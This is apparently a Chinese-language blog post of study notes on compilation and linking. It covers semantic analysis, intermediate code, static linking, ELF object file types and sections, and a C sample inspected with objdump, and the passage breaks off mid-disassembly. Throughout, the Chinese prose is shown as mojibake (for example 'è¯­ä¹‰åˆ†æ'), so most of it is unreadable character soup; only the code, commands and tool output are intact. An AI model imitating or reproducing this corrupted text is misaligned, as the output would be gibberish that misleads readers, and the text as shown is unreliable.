è¯­ä¹‰åˆ†æ</h3><p><strong>è¯­ä¹‰åˆ†æå™¨</strong>è¿›è¡Œè¯­ä¹‰åˆ†æ</p><p>ç¼–è¯‘å™¨æ‰€èƒ½åˆ†æçš„åªæ˜¯<strong>é™æ€è¯­ä¹‰</strong>ï¼Œä¸ä¹‹æ‰€å¯¹åº”çš„<strong>åŠ¨æ€è¯­ä¹‰</strong>ï¼Œåªæœ‰åœ¨è¿è¡Œè¿‡ç¨‹ä¸­æ‰å¯ä»¥ç¡®å®š</p><p>é™æ€è¯­ä¹‰é€šå¸¸åŒ…æ‹¬å£°æ˜å’Œç±»å‹çš„åŒ¹é…ï¼Œç±»å‹è½¬æ¢ã€‚</p><p>ä¾‹å¦‚å°†æµ®ç‚¹æ•°èµ‹å€¼ç»™æŒ‡é’ˆå¾ˆæ˜æ˜¾å°±æ˜¯ç±»å‹ä¸åŒ¹é…çš„ã€‚</p><p>ç»è¿‡è¯­ä¹‰åˆ†æä¹‹åï¼Œè¯­æ³•æ ‘ä¸Šçš„è¡¨è¾¾å¼ä¼šè¢«æ ‡è¯†ç±»å‹ã€‚</p><h3 id="2-4-ä¸­é—´è¯­è¨€ç”Ÿæˆ"><a href="#2-4-ä¸­é—´è¯­è¨€ç”Ÿæˆ" class="headerlink" title="2.4 ä¸­é—´è¯­è¨€ç”Ÿæˆ"></a>2.4 ä¸­é—´è¯­è¨€ç”Ÿæˆ</h3><p><strong>æºç çº§ä¼˜åŒ–å™¨</strong>åœ¨ä¸åŒç¼–è¯‘å™¨ä¸­ä¼šæœ‰æ‰€å·®åˆ«ã€‚</p><p>ä½†ä½œç”¨æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯å°†æ•´ä¸ªè¯­æ³•æ ‘è½¬æ¢æˆä¸­é—´ä»£ç ã€‚</p><p>ä¸­é—´ä»£ç Â·ä½¿å¾—ç¼–è¯‘å™¨ç”Ÿæˆå‰ç«¯å’Œåç«¯ã€‚å‰ç«¯è´Ÿè´£äº§ç”Ÿæœºå™¨æ— å…³çš„ä¸­é—´ä»£ç ï¼Œç¼–è¯‘å™¨åç«¯å°†ä¸­é—´ä»£ç è½¬æ¢æˆç›®æ ‡æœºå™¨ä»£ç ã€‚</p><h3 id="2-5-ç›®æ ‡ä»£ç ç”Ÿæˆä¸ä¼˜åŒ–"><a href="#2-5-ç›®æ ‡ä»£ç ç”Ÿæˆä¸ä¼˜åŒ–" class="headerlink" title="2.5 ç›®æ ‡ä»£ç ç”Ÿæˆä¸ä¼˜åŒ–"></a>2.5 ç›®æ ‡ä»£ç ç”Ÿæˆä¸ä¼˜åŒ–</h3><p>ç¼–è¯‘å™¨åç«¯ä¸»è¦åŒ…æ‹¬<strong>ä»£ç ç”Ÿæˆå™¨</strong>å’Œ<strong>ç›®æ ‡ä»£ç ä¼˜åŒ–å™¨</strong></p><p>ä»£ç ç”Ÿæˆå™¨ï¼šå°†ä¸­é—´ä»£ç è½¬æ¢æˆæœºå™¨ä»£ç ï¼Œä¸åŒæœºå™¨çš„ä¸åŒå­—é•¿ã€å¯„å­˜å™¨ã€æ•´æ•°æ•°æ®ç±»å‹ã€æµ®ç‚¹æ•°æ•°æ®ç±»å‹éƒ½ä¼šå½±å“ä»£ç ç”Ÿæˆå™¨ã€‚</p><p>æˆ‘ä»¬ç»è¿‡ä»¥ä¸Šæ­¥éª¤ç”Ÿæˆçš„ä»£ç å…¨éƒ½æ˜¯<strong>æœªç»é“¾æ¥çš„ç›®æ ‡ä»£ç </strong>ï¼Œæœ€ç»ˆéƒ½éœ€è¦é€šè¿‡é“¾æ¥å™¨å°†ç›®æ ‡æ–‡ä»¶é“¾æ¥èµ·æ¥äº§ç”Ÿå¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><h2 id="3-é“¾æ¥å™¨"><a href="#3-é“¾æ¥å™¨" class="headerlink" title="3.é“¾æ¥å™¨"></a>3.é“¾æ¥å™¨</h2><p><strong>é‡å®šä½</strong>ï¼šé‡æ–°è®¡ç®—å„ä¸ªç›®æ ‡åœ°å€è¿‡ç¨‹</p><p><strong>ç¬¦å·</strong>ï¼šç”¨æ¥è¡¨ç¤ºä¸€ä¸ªåœ°å€ï¼Œå¯èƒ½æ˜¯ä¸€æ®µå­ç¨‹åºçš„èµ·å§‹åœ°å€ï¼Œæˆ–ä¸€ä¸ªå˜é‡çš„èµ·å§‹åœ°å€</p><h2 id="4-é™æ€é“¾æ¥"><a href="#4-é™æ€é“¾æ¥" class="headerlink" title="4.é™æ€é“¾æ¥"></a>4.é™æ€é“¾æ¥</h2><p>æ¯ä¸ªæºç ç‹¬ç«‹åœ°ç¼–è¯‘ï¼Œç„¶åæŒ‰ç…§éœ€è¦å°†ä»–ä»¬ç»„è£…èµ·æ¥ï¼Œç»„è£…æ¨¡å—çš„è¿‡ç¨‹å«åš<strong>é“¾æ¥</strong>ã€‚</p><p>é“¾æ¥è¿‡ç¨‹åŒ…æ‹¬<strong>åœ°å€ç©ºé—´åˆ†é…ï¼ˆAddress and Storage Allocationï¼‰ã€ç¬¦å·å†³è®®ï¼ˆSymbol Resolutionï¼‰å’Œé‡å®šä½ï¼ˆRelocationï¼‰</strong></p><blockquote><p>ç¬¦å·å†³è®®å’Œç¬¦å·ç»‘å®šå¤§ä½“æ˜¯å·®ä¸å¤šçš„ï¼Œä½†å†³è®®ç”¨äºé™æ€é“¾æ¥ï¼Œç»‘å®šç”¨äºåŠ¨æ€é“¾æ¥</p></blockquote><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210207155541582.png" alt="image-20210207155541582"></p><p>å¦‚å›¾æ‰€ç¤ºï¼Œæºä»£ç æ–‡ä»¶ç¼–è¯‘æˆç›®æ ‡æ–‡ä»¶ï¼Œ<strong>ç›®æ ‡æ–‡ä»¶å’Œåº“ä¸€èµ·é“¾æ¥æˆå¯æ‰§è¡Œæ–‡ä»¶</strong>ã€‚</p><blockquote><p>ä¸¾ä¸ªä¾‹å­</p><p>åœ¨main.cä¸­éœ€è¦å…¶ä»–æ¨¡å—fun.cä¸­çš„foo()</p><p>æ‰€ä»¥æˆ‘ä»¬åœ¨main.cä¸­æ¯ä¸€å¤„è°ƒç”¨fooçš„æ—¶å€™éƒ½å¿…é¡»çŸ¥é“fooè¿™ä¸ªå‡½æ•°çš„åœ°å€ï¼Œä½†ç”±äºæ˜¯å•ç‹¬ç¼–è¯‘çš„</p><p>æˆ‘ä»¬å¹¶ä¸çŸ¥é“è¿™ä¸ªåœ°å€ï¼Œè‹¥æ— é“¾æ¥å™¨ï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨ä¿®æ­£åœ°å€</p><p>é€šè¿‡é“¾æ¥å™¨æˆ‘ä»¬å¯ä»¥ç›´æ¥å¼•ç”¨fooè€Œæ— éœ€çŸ¥é“å®ƒçš„åœ°å€ï¼Œå› ä¸ºé“¾æ¥å™¨åœ¨é“¾æ¥çš„æ—¶å€™ï¼Œä¼šæ ¹æ®æ‰€å¼•ç”¨çš„ç¬¦å·fooï¼Œè‡ªåŠ¨å»ç›¸åº”çš„æ¨¡å—æŸ¥æ‰¾fooçš„åœ°å€ï¼Œå¹¶å°†mainä¸­fooçš„åœ°å€é‡æ–°ä¿®æ­£</p></blockquote><h1 id="0x02-ç›®æ ‡æ–‡ä»¶"><a href="#0x02-ç›®æ ‡æ–‡ä»¶" class="headerlink" title="0x02 ç›®æ ‡æ–‡ä»¶"></a>0x02 ç›®æ ‡æ–‡ä»¶</h1><p>æˆ‘ä»¬ä¸Šé¢å·²ç»çŸ¥é“æºä»£ç ç»è¿‡é¢„å¤„ç†ï¼Œç¼–è¯‘ï¼Œæ±‡ç¼–äº§ç”Ÿçš„æ–‡ä»¶å°±å«<strong>ç›®æ ‡æ–‡ä»¶</strong>ã€‚</p><p>ç›®æ ‡æ–‡ä»¶å…¶å®æ˜¯å·²ç»ç¼–è¯‘åçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œåªæ˜¯æœ‰äº›ç¬¦å·å’Œåœ°å€æœªè¢«è°ƒæ•´ï¼Œæœ¬èº«å°±æ˜¯æŒ‰ç…§å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼å­˜å‚¨çš„ï¼Œä½†å’ŒçœŸæ­£å¯æ‰§è¡Œæ–‡ä»¶è¿˜æœ‰æ‰€ä¸åŒã€‚</p><p>å¯ä»¥å…ˆæ¥çœ‹ä¸€ä¸‹</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210207161220722.png" alt="image-20210207161220722"></p><p>ä¸‹é¢æˆ‘ä»¬å°†è®²è¿™ä¸ªæ–‡ä»¶åˆ°åº•æ˜¯ä»€ä¹ˆ</p><h2 id="1-ç›®æ ‡æ–‡ä»¶çš„æ ¼å¼"><a href="#1-ç›®æ ‡æ–‡ä»¶çš„æ ¼å¼" class="headerlink" title="1.ç›®æ ‡æ–‡ä»¶çš„æ ¼å¼"></a>1.ç›®æ ‡æ–‡ä»¶çš„æ ¼å¼</h2><p>æˆ‘ä»¬ç†ŸçŸ¥çš„windowsä¸‹çš„PEï¼ˆPortable Executableï¼‰å’ŒLinuxçš„ELFï¼ˆExecutable Linkable Formatï¼‰çš„æ˜¯å¯æ‰§è¡Œæ–‡ä»¶</p><p>ç›®æ ‡æ–‡ä»¶å°±æ˜¯æºä»£ç ç¼–è¯‘åä½†æœªè¿›è¡Œé“¾æ¥çš„ä¸­é—´æ–‡ä»¶ã€‚å®ƒä¸å¯æ‰§è¡Œæ–‡ä»¶çš„å†…å®¹å’Œç»“æ„å¾ˆç›¸ä¼¼ï¼Œæ‰€ä»¥ä¸€èˆ¬è·Ÿå¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ä¸€èµ·ç”¨ä¸€ç§æ ¼å¼å­˜å‚¨ã€‚</p><p>æ­¤å¤–ï¼Œè¿˜æœ‰å…¶ä»–å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼OMFï¼ˆObject Module Formatï¼‰å’ŒUnix a.outæ ¼å¼å’ŒMS-DOS.COMæ ¼å¼ç­‰ã€‚</p><p><strong>åŠ¨æ€é“¾æ¥åº“</strong>ï¼ˆDynamic Linking Libraryï¼‰ï¼ˆwindowsä¸‹çš„dllå’Œlinuxä¸­çš„soï¼‰åŠ<strong>é™æ€é“¾æ¥åº“</strong>ï¼ˆStatic Linking Libaryï¼‰ï¼ˆwindowsä¸‹çš„libå’ŒLinuxä¸­çš„aï¼‰éƒ½æŒ‰ç…§å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼å­˜å‚¨</p><p>é™æ€é“¾æ¥åº“æ˜¯ä¸€ä¸ªåŒ…å«æœ‰å¾ˆå¤šç›®æ ‡æ–‡ä»¶çš„æ–‡ä»¶åŒ…</p><p>æ–‡ä»¶æ ¼å¼å¦‚ä¸‹</p><div class="table-container"><table><thead><tr><th style="text-align:left">ELFæ–‡ä»¶ç±»å‹</th><th>è¯´æ˜</th><th>å®ä¾‹</th></tr></thead><tbody><tr><td style="text-align:left">é‡å®šä½æ–‡ä»¶(Relocatable File)</td><td>åŒ…å«ä»£ç å’Œæ•°æ®ï¼Œå¯ä»¥è¢«é“¾æ¥æˆå¯æ‰§è¡Œæ–‡ä»¶æˆ–ç›®æ ‡æ–‡ä»¶</td><td>Linuxä¸­.o Winä¸‹çš„obj</td></tr><tr><td style="text-align:left">å¯æ‰§è¡Œæ–‡ä»¶(Executable File)</td><td>å¯ä»¥æ‰§è¡Œçš„ç¨‹åº,é€šå¸¸æ— æ‰©å±•å</td><td>Linuxä¸­.out Winä¸‹çš„.exe</td></tr><tr><td style="text-align:left">å…±äº«ç›®æ ‡æ–‡ä»¶(Shared Object File)</td><td>åŒ…å«ä»£ç å’Œæ•°æ®ï¼Œæœ‰ä¸¤ç§æƒ…å†µã€‚ç¬¬ä¸€ç§æ˜¯é“¾æ¥å™¨å¯ä»¥ä½¿ç”¨è¿™ç§æ–‡ä»¶è·Ÿå…¶ä»–çš„é‡å®šä½æ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶è¿›è¡Œé“¾æ¥äº§ç”Ÿ<strong>æ–°çš„ç›®æ ‡æ–‡ä»¶</strong>ã€‚ç¬¬äºŒç§äº‹åŠ¨æ€é“¾æ¥å™¨å¯ä»¥å°†å‡ ä¸ªå…±äº«ç›®æ ‡æ–‡ä»¶ä¸å¯æ‰§è¡Œæ–‡ä»¶ç»“åˆï¼Œä½œä¸ºè¿›ç¨‹æ˜ åƒçš„ä¸€éƒ¨åˆ†æ¥è¿è¡Œ</td><td>Linuxä¸­.soå’ŒWinä¸­DLL</td></tr><tr><td style="text-align:left">æ ¸å¿ƒè½¬å‚¨æ–‡ä»¶(Core Dump File)</td><td>å½“è¿›ç¨‹æ„å¤–ç»ˆæ­¢æ—¶ï¼Œç³»ç»Ÿå¯ä»¥å°†è¯¥è¿›ç¨‹çš„åœ°å€ç©ºé—´çš„å†…å®¹åŠç»ˆæ­¢æ—¶çš„ä¸€äº›å…¶ä»–ä¿¡æ¯è½¬å‚¨åˆ°æ ¸å¿ƒè½¬å‚¨æ–‡ä»¶</td><td>Linuxä¸­çš„Core Dump</td></tr></tbody></table></div><blockquote><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210208204903438.png" alt="image-20210208204903438"></p></blockquote><h2 id="2-ç›®æ ‡æ–‡ä»¶æ˜¯ä»€ä¹ˆæ ·çš„"><a href="#2-ç›®æ ‡æ–‡ä»¶æ˜¯ä»€ä¹ˆæ ·çš„" class="headerlink" title="2.ç›®æ ‡æ–‡ä»¶æ˜¯ä»€ä¹ˆæ ·çš„"></a>2.ç›®æ ‡æ–‡ä»¶æ˜¯ä»€ä¹ˆæ ·çš„</h2><p>ç›®æ ‡æ–‡ä»¶é™¤äº†æœºå™¨æŒ‡ä»¤ä»£ç ã€æ•°æ®ï¼Œè¿˜åŒ…æ‹¬äº†é“¾æ¥æ—¶æ‰€éœ€è¦çš„ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚ç¬¦å·è¡¨ã€è°ƒè¯•ä¿¡æ¯å’Œç¬¦å·ä¸²ç­‰ã€‚</p><p>ç›®æ ‡æ–‡ä»¶é€šå¸¸å°†è¿™äº›ä¿¡æ¯æŒ‰ä¸åŒçš„å±æ€§ï¼Œä»¥<strong>èŠ‚</strong>ï¼ˆSectionï¼‰æ¥å­˜å‚¨ï¼Œä¹Ÿå«<strong>æ®µ</strong>ï¼ˆSegmentï¼‰</p><p>æˆ‘ä»¬ç†ŸçŸ¥çš„ä»£ç æ®µã€æ•°æ®æ®µå°±æ˜¯è¿™ä¸ªä¸œè¥¿</p><p><strong>ä»£ç æ®µ</strong>å­˜å‚¨ä»£ç å«<code>.code</code>æˆ–<code>.text</code></p><p><strong>æ•°æ®æ®µ</strong>å­˜å‚¨å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡å«<code>.data</code></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210208205643721.png" alt="image-20210208205643721"></p><blockquote><p>ä»è¿™ä¸ªå›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼ŒELFæ–‡ä»¶çš„å¼€å¤´æ˜¯ä¸€ä¸ªæ–‡ä»¶å¤´ï¼Œ<strong>å®ƒæè¿°äº†æ•´ä¸ªæ–‡ä»¶çš„æ–‡ä»¶å±æ€§ï¼ŒåŒ…æ‹¬æ–‡ä»¶æ˜¯å¦å¯æ‰§è¡Œã€æ˜¯é™æ€é“¾æ¥è¿˜æ˜¯åŠ¨æ€é“¾æ¥ã€ç›®æ ‡ç¡¬ä»¶ã€ç›®æ ‡æ“ä½œç³»ç»Ÿç­‰å„ç§ä¿¡æ¯</strong></p><p>æ­¤å¤–ï¼Œæ–‡ä»¶å¤´è¿˜æœ‰ä¸€ä¸ª<strong>æ®µè¡¨</strong>ï¼Œ</p><p>æ®µè¡¨æ˜¯ä¸€ä¸ªæè¿°<strong>æ–‡ä»¶ä¸­å„ä¸ªæ®µçš„æ•°ç»„</strong>ã€‚æ®µè¡¨æè¿°äº†æ–‡ä»¶ä¸­å„ä¸ªæ®µåœ¨æ–‡ä»¶ä¸­çš„åç§»ä½ç½®ä»¥åŠæ®µçš„å±æ€§ç­‰ï¼Œä»æ®µé‡Œé¢å¯ä»¥å¾—åˆ°æ¯ä¸ªæ®µçš„æ‰€æœ‰ä¿¡æ¯ã€‚</p><p>æ–‡ä»¶å¤´ä¹‹åå°±æ˜¯å„ä¸ªæ®µçš„å†…å®¹</p></blockquote><p><code>.text</code>ï¼šå­˜å‚¨cè¯­è¨€ç¼–è¯‘åçš„æ‰§è¡Œè¯­å¥ç¼–è¯‘æˆçš„æœºå™¨ä»£ç </p><p><code>.data</code>ï¼šå­˜å‚¨å·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡</p><p><code>.bss</code>ï¼šå­˜å‚¨æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡</p><blockquote><p>é‚£ä¹ˆä¸ºä»€ä¹ˆè¦è®¾ç½®bssæ®µå‘¢ï¼Ÿ</p><p>åœ¨ç¨‹åºä¸­ï¼Œæœªåˆå§‹åŒ–çš„å˜é‡æ˜¯0ï¼Œå¦‚æœæŠŠä»–ä»¬æ”¾åœ¨dataæ®µå¹¶åˆ†é…ç©ºé—´èµ‹å€¼0æ˜¯å®Œå…¨æµªè´¹ç©ºé—´çš„ä¸€ç§åšæ³•ï¼Œ</p><p>æ‰€ä»¥å¯æ‰§è¡Œæ–‡ä»¶ä¸ºäº†è®°å½•æ‰€æœ‰æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡çš„å¤§å°æ€»å’Œï¼Œè®°åšbssæ®µ</p><p><strong>bssæ®µåªæ˜¯ä¸ºæœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡é¢„ç•™ä½ç½®è€Œå·²ï¼Œå¹¶æ²¡æœ‰å†…å®¹ï¼Œåœ¨æ–‡ä»¶ä¸­ä¹Ÿä¸å ç©ºé—´</strong></p></blockquote><p><strong>æ€»ä½“æ¥è¯´ï¼Œç¨‹åºæºä»£ç è¢«ç¼–è¯‘ä»¥åä¸»è¦åˆ†æˆä¸¤ç§æ®µï¼šç¨‹åºæŒ‡ä»¤å’Œç¨‹åºæ•°æ®ã€‚ä»£ç æ®µå±äºç¨‹åºæŒ‡ä»¤ï¼Œè€Œæ•°æ®æ®µå’Œbssæ®µå±äºç¨‹åºæ•°æ®ã€‚</strong></p><h2 id="3-æŒ–æ˜SimpleSection-o"><a href="#3-æŒ–æ˜SimpleSection-o" class="headerlink" title="3.æŒ–æ˜SimpleSection.o"></a>3.æŒ–æ˜SimpleSection.o</h2><p>è¿™é‡Œæˆ‘ä»¬æ¢æˆa.o</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> global_init_var = <span class="number">84</span>;</span><br><span class="line"><span class="keyword">int</span> global_uninit_var;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> static_var = <span class="number">85</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> static_var2;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> b;</span><br><span class="line">func1(static_var + static_var2 + a + b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ä¸€ä¸‹</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210209161901015.png" alt="image-20210209161901015"></p><p>ç°åœ¨æˆ‘ä»¬æ¥å…·ä½“åˆ†æä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -h a.o</span><br><span class="line">&#x2F;&#x2F;-hå°†åŸºæœ¬ä¿¡æ¯æ‰“å°å‡ºæ¥</span><br><span class="line">&#x2F;&#x2F;-xæ‰“å°æ›´å¤šä¿¡æ¯</span><br></pre></td></tr></table></figure><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210209162052499.png" alt="image-20210209162052499"></p><blockquote><p>ä»£ç æ®µï¼Œæ•°æ®æ®µï¼Œbssæ®µæˆ‘ä»¬å·²ç»çŸ¥é“äº†</p><p>å¯ä»¥çœ‹åˆ°è¿˜æœ‰<strong>åªè¯»æ•°æ®æ®µ</strong><code>.rodata</code> <strong>æ³¨é‡Šæ®µ</strong><code>.comment</code> <strong>å †æ ˆæç¤ºæ®µ</strong><code>.note.GNU-stack</code>æ®µ</p><p>ä¸‹é¢ç¬¬äºŒè¡ŒCONTENTS ALLOCè¡¨ç¤ºæ®µçš„å„ç§å±æ€§ï¼ŒCONTENTSè¡¨ç¤ºè¯¥æ®µåœ¨æ–‡ä»¶ä¸­å­˜åœ¨</p><p>çœ‹åˆ°BSSæ®µæ˜¯æ²¡æœ‰CONTENTSè¡¨ç¤ºå®ƒå®é™…åœ¨ELFæ–‡ä»¶ä¸­ä¸å­˜åœ¨å†…å®¹</p><p>ä¸‹é¢æˆ‘ä»¬å°±æ¥çœ‹ä¸€ä¸‹å„ä¸ªæ®µçš„åˆ†å¸ƒ</p></blockquote><p>è¿™é‡Œå’Œä¹¦ä¸Šä¸åŒçš„æ˜¯<code>.note.GNU-stack</code>å äº†å†…å®¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹ŸæŠŠä»–å†™ä¸Š</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210209163804417.png" alt="image-20210209163804417"></p><h3 id="3-1-ä»£ç æ®µ"><a href="#3-1-ä»£ç æ®µ" class="headerlink" title="3.1 ä»£ç æ®µ"></a>3.1 ä»£ç æ®µ</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -s -d a.o</span><br><span class="line">&#x2F;&#x2F;-s å°†æ®µå†…å®¹æŒ‰ç…§16è¿›åˆ¶æ‰“å°</span><br><span class="line">&#x2F;&#x2F;-d å¯ä»¥å°†æ‰€æœ‰åŒ…å«æŒ‡ä»¤çš„æ®µåæ±‡ç¼–</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">a.oï¼š     æ–‡ä»¶æ ¼å¼ elf32-i386</span><br><span class="line"></span><br><span class="line">Contents of section .text:</span><br><span class="line"> 0000 5589e583 ec0883ec 08ff7508 68000000  U.........u.h...</span><br><span class="line"> 0010 00e8fcff ffff83c4 1090c9c3 8d4c2404  .............L$.</span><br><span class="line"> 0020 83e4f0ff 71fc5589 e55183ec 14c745f0  ....q.U..Q....E.</span><br><span class="line"> 0030 01000000 8b150400 0000a100 00000001  ................</span><br><span class="line"> 0040 c28b45f0 01c28b45 f401d083 ec0c50e8  ..E....E......P.</span><br><span class="line"> 0050 fcffffff 83c410b8 00000000 8b4dfcc9  .............M..</span><br><span class="line"> 0060 8d61fcc3                             .a..            </span><br><span class="line">Contents of section .data:</span><br><span class="line"> 0000 54000000 55000000                    T...U...        </span><br><span class="line">Contents of section .rodata:</span><br><span class="line"> 0000 25640a00                             %d..            </span><br><span class="line">Contents of section .comment:</span><br><span class="line"> 0000 00474343 3a202855 62756e74 7520352e  .GCC: (Ubuntu 5.</span><br><span class="line"> 0010 342e302d 36756275 6e747531 7e31362e  4.0-6ubuntu1~16.</span><br><span class="line"> 0020 30342e31 32292035 2e342e30 20323031  04.12) 5.4.0 201</span><br><span class="line"> 0030 36303630 3900                        60609.          </span><br><span class="line">Contents of section .eh_frame:</span><br><span class="line"> 0000 14000000 00000000 017a5200 017c0801  .........zR..|..</span><br><span class="line"> 0010 1b0c0404 88010000 1c000000 1c000000  ................</span><br><span class="line"> 0020 00000000 1c000000 00410e08 8502420d  .........A....B.</span><br><span class="line"> 0030 0558c50c 04040000 28000000 3c000000  .X......(...&lt;...</span><br><span class="line"> 0040 1c000000 48000000 00440c01 00471005  ....H....D...G..</span><br><span class="line"> 0050 02750043 0f03757c 06750c01 0041c543  .u.C..u|.u...A.C</span><br><span class="line"> 0060 0c040400                             ....            </span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;func1&gt;:</span><br><span class="line">   0:55                   push   %ebp</span><br><span class="line">   1:89 e5                mov    %esp,%ebp</span><br><span class="line">   3:83 ec 08             sub    $0x8,%esp</span><br><span class="line">   6:83 ec 08             sub    $0x8,%esp</span><br><span class="line">   9:ff 75 08             pushl  0x8(%ebp)</span><br><span class="line">   c:68 00 00 00 00       push   $0x0</span><br><span class="line">  11:e8 fc ff ff ff       call   12 &lt;func1+0x12&gt;</span><br><span class="line">  16:83 c4 10             add    $0x10,%esp</span><br><span class="line">  19:90                   nop</span><br><span class="line">  1a:c9                   leave  </span><br><span class="line">  1b:c3                   ret    </span><br><span class="line"></span><br><span class="line">0000001c &lt;main&gt;:</span><br><span class="line">  1c:8d 4c 24 04          lea    0x4(%esp),%ecx</span><br><span class="line">  20:83 e4 f0             and    $0xfffffff0,%esp</span><br><span class="line">  23:ff 71 fc             pushl  -0x4(%ecx)</span><br><span class="line">  26:55                   push   %ebp</span><br><span class="line">  27:89 e5                mov    %esp,%ebp</span><br><span class="line">  29:51                   push   %ecx</span><br><span class="line">  2a:83 ec 14             sub    $0x14,%esp</span><br><span class="line">  2d:c7 45 f0 01 00 00 00 movl   $0x1,-0x10(%ebp)</span><br><span class="line">  34:8b 15 04 00 00 00    mov    0x4,%edx</span><br><span class="line">  3a:a1 00 00 00 00       mov    0x0,%eax</span><br><span class="line">  3f:01 c2                add    %eax,%edx</span><br><span class="line">  41:8b 45 f0             mov    -0x10(%ebp),%eax</span><br><span class="line">  44:01 c2                add    %eax,%edx</span><br><span class="line">  46:8b 45 f4             mov    -0xc(%ebp),%eax</span><br><span class="line">  49:01 d0                add    %edx,%eax</span><br><span class="line">  4b:83 ec 0c             sub    $0xc,%esp</span><br><span class="line">  4e:50                   push   %eax</span><br><span class="line">  4f:e8 fc ff ff ff       